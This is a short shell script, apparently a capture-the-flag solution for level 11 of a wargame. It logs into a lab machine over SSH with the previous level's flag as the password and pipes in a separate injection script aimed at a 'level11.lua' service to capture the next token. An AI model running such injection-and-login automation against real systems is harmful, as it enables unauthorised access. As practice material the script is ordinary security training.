#!/bin/sh -eu

PREVIOUS_FLAG=../../level10/flag
ADDRESS=192.168.122.214
PORT=4242
FLAG=../flag

# Run the script to hack the `level11.lua` file and save the token in a file
sshpass -f ${PREVIOUS_FLAG} <inject_shell_command.sh >${FLAG} 2>/dev/null \
	ssh -p ${PORT} level11@${ADDRESS} \
		sh -s
